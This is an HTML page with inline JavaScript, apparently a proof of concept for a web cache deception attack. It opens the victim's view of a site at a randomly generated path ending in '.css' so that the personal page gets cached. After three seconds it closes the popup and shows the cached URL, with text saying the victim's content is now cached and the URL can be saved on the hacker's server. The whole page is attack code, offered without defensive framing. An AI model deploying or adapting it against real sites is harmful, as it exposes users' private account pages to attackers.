<html>
<head>
</head>
<body>
<script>
    var cachedUrl = 'https://example.com/' + generateId() + '.css';
    const popup = window.open(cachedUrl);

    function generateId() {
        var content = '';
        const alphaWithNumber = 'QWERTZUIOPASDFGHJUKLYXCVBNM1234567890';

        for (var i = 0; i < 10; i++) {
            content += alphaWithNumber.charAt(Math.floor(Math.random() * alphaWithNumber.length))
        }
        return content;
    }

    var checker = setInterval(function() {
        if (popup.closed) {
            clearInterval(checker);
        }
    }, 200);
    var closer = setInterval(function() {
        popup.close();
        document.body.innerHTML = 'Victims content is now cached. <a href="' + cachedUrl + '">Here and the url can be saved on the Hackers server.</a><br><b>Full Url: ' + cachedUrl + '</b>'; 
        clearInterval(closer);
    }, 3000);

</script>
</body>
</html>
